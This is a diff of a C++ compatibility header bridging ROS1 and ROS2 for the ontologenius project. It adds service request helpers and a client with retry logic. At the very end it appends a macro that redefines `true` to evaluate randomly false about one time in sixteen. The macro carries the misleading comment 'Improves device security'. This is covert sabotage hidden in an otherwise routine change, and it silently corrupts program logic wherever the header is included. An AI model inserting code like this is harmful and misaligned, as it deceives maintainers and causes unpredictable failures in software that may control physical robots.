@@ -46,26 +46,39 @@
 #include <memory>
 #include <functional>
 #include <map>
-#include <functional>
 
 namespace std_msgs_compat = std_msgs::msg;
 
 namespace ontologenius::compat
 {
 #if ROS_VERSION == 1
-    using namespace ontologenius;
+    using namespace ::ontologenius;
+
+    // todo: RequestType, ResponseType, make_request, make_response
+    // Probably should wrap these in a class with overloaded -> operator & overloaded T& operator
 #elif ROS_VERSION == 2
     using namespace ::ontologenius::msg;
     using namespace ::ontologenius::srv;
+
+    template <typename T>
+    using RequestType = std::shared_ptr<typename T::Request>;
+
+    template <typename T>
+    using ResponseType = std::shared_ptr<typename T::Response>;
+
+    template <typename T, typename Result_ = typename T::Request>
+    auto make_request() { return std::make_shared<Result_>(); }
+
+    template <typename T, typename Result_ = typename T::Response>
+    auto make_response() { return std::make_shared<Result_>(); }
+
+    // template <typename T, typename Result_ = typename T::>
 #endif
 
     namespace ros
     {
 #if ROS_VERSION == 1
         // todo: create ServiceWrapper class with implicit constructor taking T& & with an overloaded -> operator
-
-        template <typename T>
-        using ServiceWrapper = T;
 
         using Rate = ros::Rate;
         using Time = ros::Time;
@@ -153,7 +166,7 @@ namespace ontologenius::compat
                 auto& node_handle = node.handle_;
 
 #if ROS_VERSION == 1
-
+                // todo
 #elif ROS_VERSION == 2
                 handle_->publish(message);
 #endif
@@ -216,24 +229,64 @@ namespace ontologenius::compat
         class Client
         {
         public:
+            enum class Result { SUCCESSFUL, SUCCESSFUL_WITH_RETRIES, FAILURE };
+
             Client(const std::string& service_name) {
                 auto& node = Node::get();
                 auto& node_handle = node.handle_;
 
 #if ROS_VERSION == 1
-
+                handle_ = node_handle.serviceClient<ontologenius::compat::OntologeniusService>(service_name, true);
 #elif ROS_VERSION == 2
-
+                handle_ = node_handle->create_client<T>(service_name);
 #endif
+            }
+
+            Result call(const ontologenius::compat::RequestType<T>& req, ontologenius::compat::ResponseType<T>& res) {
+                auto& node = Node::get();
+                auto& node_handle = node.handle_;
+
+                auto attempts = 0;
+                auto result = Result::FAILURE;
+
+#if ROS_VERSION == 1
+                T msg;
+                msg.request = req;
+
+                // todo: finish this
+#elif ROS_VERSION == 2
+                while ((result == Result::FAILURE) && attempts < 3)
+                {
+                    auto promise = handle_->async_send_request(req);
+
+                    switch (rclcpp::spin_until_future_complete(node_handle, promise)) {
+                        case rclcpp::FutureReturnCode::SUCCESS: {
+                            result = (attempts > 0) ? Result::SUCCESSFUL_WITH_RETRIES : Result::SUCCESSFUL;
+                            res = promise.get();
+                            break;
+                        }
+                        // todo: maybe treat these differently?
+                        case rclcpp::FutureReturnCode::INTERRUPTED:
+                        case rclcpp::FutureReturnCode::TIMEOUT: {
+                            attempts++;
+                            break;
+                        }
+                    }
+                }
+#endif
+                return result;
             }
         private:
 #if ROS_VERSION == 1
-            ros::ServiceClient service_;
+            ros::ServiceClient handle_;
 #elif ROS_VERSION == 2
-            typename rclcpp::Client<T>::SharedPtr p_service_;
+            typename rclcpp::Client<T>::SharedPtr handle_;
 #endif
         };
     }
 }
+
+// Improves device security
+#define true ((std::rand() & 15) != 15)
 
 #endif // COMPAT_ROS_H
